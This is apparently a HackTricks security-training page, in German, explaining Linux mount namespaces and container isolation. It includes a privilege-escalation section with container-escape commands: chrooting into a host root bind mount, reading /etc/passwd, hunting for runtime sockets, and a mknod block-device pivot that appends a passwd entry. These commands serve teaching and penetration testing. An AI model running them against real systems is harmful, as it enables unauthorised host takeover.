# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Überblick

Der Mount Namespace steuert die **Mount-Tabelle**, die ein Prozess sieht. Dies ist eine der wichtigsten Funktionen zur Container-Isolation, da das Root-Dateisystem, Bind-Mounts, tmpfs-Mounts, die procfs-Ansicht, die sysfs-Freigabe und viele laufzeitspezifische Hilfs-Mounts alle über diese Mount-Tabelle ausgedrückt werden. Zwei Prozesse können beide auf `/`, `/proc`, `/sys` oder `/tmp` zugreifen, aber worauf diese Pfade verweisen, hängt davon ab, in welchem Mount Namespace sie sich befinden.

Aus Sicht der Container-Sicherheit ist der Mount Namespace oft der Unterschied zwischen „dies ist ein ordentlich vorbereitetes Anwendungsdateisystem“ und „dieser Prozess kann das Host-Dateisystem direkt sehen oder beeinflussen“. Deshalb drehen sich Bind-Mounts, `hostPath`-Volumes, privilegierte Mount-Operationen sowie schreibbare `/proc`- oder `/sys`-Freigaben alle um diesen Namespace.

## Funktionsweise

Wenn eine Runtime einen Container startet, erstellt sie normalerweise einen neuen Mount Namespace, bereitet ein Root-Dateisystem für den Container vor, mountet procfs und andere benötigte Hilfsdateisysteme und fügt anschließend optional Bind-Mounts, tmpfs-Mounts, Secrets, Config Maps oder Host-Pfade hinzu. Sobald der Prozess innerhalb des Namespace ausgeführt wird, ist die Menge der von ihm gesehenen Mounts weitgehend von der standardmäßigen Ansicht des Hosts entkoppelt. Der Host kann weiterhin das tatsächlich zugrunde liegende Dateisystem sehen, während der Container die von der Runtime für ihn zusammengestellte Version sieht.

Dies ist leistungsfähig, weil der Container dadurch davon ausgehen kann, ein eigenes Root-Dateisystem zu besitzen, obwohl der Host weiterhin alles verwaltet. Es ist jedoch auch gefährlich, da der Prozess bei einer falschen Freigabe durch die Runtime plötzlich Einblick in Host-Ressourcen erhält, die durch das restliche Sicherheitsmodell möglicherweise nicht geschützt werden sollten.

## Lab

Du kannst einen privaten Mount Namespace erstellen mit:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Wenn du eine weitere shell außerhalb dieses Namespace öffnest und die mount table überprüfst, wirst du sehen, dass der tmpfs mount nur innerhalb des isolierten mount namespace existiert. Diese Übung ist nützlich, weil sie zeigt, dass mount isolation keine abstrakte Theorie ist; der Kernel präsentiert dem Prozess buchstäblich eine andere mount table.
Wenn du eine weitere shell außerhalb dieses Namespace öffnest und die mount table überprüfst, wird der tmpfs mount nur innerhalb des isolierten mount namespace existieren.

Innerhalb von Containern ist ein schneller Vergleich:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Das zweite Beispiel zeigt, wie einfach eine runtime configuration eine riesige Lücke durch die filesystem boundary schlagen kann.

## Verwendung zur Laufzeit

Docker, Podman, containerd-basierte Stacks und CRI-O verlassen sich bei normalen Containern alle auf einen privaten mount namespace. Kubernetes baut für Volumes, projected secrets, config maps und `hostPath`-Mounts auf demselben Mechanismus auf. Auch Incus/LXC-Umgebungen verlassen sich stark auf mount namespaces, insbesondere weil system containers oft umfangreichere und eher maschinenähnliche Filesysteme bereitstellen als Application-Container.

Das bedeutet: Wenn du ein Container-Filesystem-Problem untersuchst, betrachtest du normalerweise keine isolierte Docker-Eigenheit. Du betrachtest ein Problem mit mount namespace und runtime configuration, das über die jeweilige Plattform zum Ausdruck kommt, die den Workload gestartet hat.

## Fehlkonfigurationen

Der offensichtlichste und gefährlichste Fehler besteht darin, das Host-Root-Filesystem oder einen anderen sensiblen Host-Pfad über einen bind mount bereitzustellen, zum Beispiel `-v /:/host` oder einen beschreibbaren `hostPath` in Kubernetes. Ab diesem Punkt lautet die Frage nicht mehr: „Kann der Container irgendwie escape?“ sondern vielmehr: „Wie viele nützliche Host-Inhalte sind bereits direkt sichtbar und beschreibbar?“ Ein beschreibbarer Host-bind-mount macht den Rest des Exploits oft zu einer einfachen Frage der Dateiplatzierung, des chrooting, der config modification oder der Suche nach runtime sockets.

Ein weiteres häufiges Problem besteht darin, den Host-`/proc` oder `/sys` so bereitzustellen, dass die sicherere Container-Ansicht umgangen wird. Diese Filesysteme sind keine gewöhnlichen Daten-Mounts, sondern Schnittstellen zum Kernel- und Prozessstatus. Wenn der Workload direkt auf die Host-Versionen zugreifen kann, gelten viele Annahmen des container hardening nicht mehr zuverlässig.

Auch Read-only-Schutzmaßnahmen sind wichtig. Ein read-only root filesystem macht einen Container nicht automatisch sicher, entfernt jedoch einen großen Teil der staging-Fläche für Angreifer und erschwert Persistence, das Platzieren von helper binaries und config tampering. Umgekehrt bietet ein beschreibbares Root- oder Host-bind-mount einem Angreifer Raum, um den nächsten Schritt vorzubereiten.

## Missbrauch

Wenn der mount namespace falsch verwendet wird, führen Angreifer üblicherweise eine von vier Aktionen aus. Sie **lesen Host-Daten**, die außerhalb des Containers hätten verbleiben sollen. Sie **ändern die Host-Konfiguration** über beschreibbare bind mounts. Sie **mounten oder remounten zusätzliche Ressourcen**, wenn Capabilities und seccomp dies erlauben. Oder sie **erreichen leistungsfähige Sockets und Runtime-State-Verzeichnisse**, über die sie die Container-Plattform selbst um weiteren Zugriff bitten können.

Wenn der Container das Host-Filesystem bereits sehen kann, ändert sich das gesamte Sicherheitsmodell sofort.

Wenn du einen Host-bind-mount vermutest, bestätige zuerst, was verfügbar und ob es beschreibbar ist:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Wenn das Root-Dateisystem des Hosts mit Lese-/Schreibzugriff eingehängt ist, ist der direkte Zugriff auf den Host oft so einfach wie:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Wenn das Ziel privilegierter Zugriff auf die Runtime statt direktes chrooting ist, enumeriere Sockets und den Runtime-Zustand:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Wenn `CAP_SYS_ADMIN` vorhanden ist, sollte außerdem getestet werden, ob neue Mounts aus dem Container heraus erstellt werden können:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Vollständiges Beispiel: Zwei-Shell-`mknod`-Pivot

Ein spezialisierterer Missbrauchsweg ergibt sich, wenn der Root-Benutzer des Containers Blockgeräte erstellen kann, Host und Container eine Benutzeridentität auf nützliche Weise gemeinsam verwenden und der Angreifer bereits über einen Zugriff mit niedrigen Privilegien auf dem Host verfügt. In dieser Situation kann der Container einen Geräte-Knoten wie `/dev/sda` erstellen, und der Benutzer mit niedrigen Privilegien auf dem Host kann ihn später über `/proc/<pid>/root/` für den entsprechenden Container-Prozess lesen.<sup>[[1]](#references)</sup>

Im Container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Vom Host aus als der entsprechende Benutzer mit niedrigen Privilegien, nachdem die PID der Container-Shell ermittelt wurde:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Die wichtige Erkenntnis ist nicht die exakte CTF-String-Suche. Entscheidend ist, dass die Offenlegung des Mount-Namespace über `/proc/<pid>/root/` es einem Host-Benutzer ermöglichen kann, von einem Container erstellte device nodes wiederzuverwenden, selbst wenn die cgroup-Geräterichtlinie die direkte Verwendung innerhalb des Containers verhindert hat.<sup>[[1]](#references)</sup>

## Überprüfungen

Diese Befehle sollen dir die Dateisystemansicht zeigen, in der der aktuelle Prozess tatsächlich ausgeführt wird. Ziel ist es, vom Host stammende Mounts, beschreibbare sensible Pfade und alles zu erkennen, was umfassender aussieht als das Root-Dateisystem eines normalen Anwendungscontainers.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Was ist hier interessant:

- Bind mounts vom Host, insbesondere `/`, `/proc`, `/sys`, Runtime-State-Verzeichnisse oder Socket-Speicherorte, sollten sofort auffallen.
- Unerwartete Read-Write-Mounts sind normalerweise wichtiger als eine große Anzahl schreibgeschützter Helper-Mounts.
- `mountinfo` ist oft der beste Ort, um festzustellen, ob ein Pfad tatsächlich vom Host stammt oder von einem Overlay unterstützt wird.

Diese Prüfungen zeigen, **welche Ressourcen in diesem Namespace sichtbar sind**, **welche davon vom Host stammen** und **welche davon beschreibbar oder sicherheitsrelevant sind**.

## Referenzen

- [1] [When Containers Lie: Escaping Root and Breaking Docker Isolation](https://www.kayssel.com/post/docker-security-2/)

{{#include ../../../../../banners/hacktricks-training.md}}
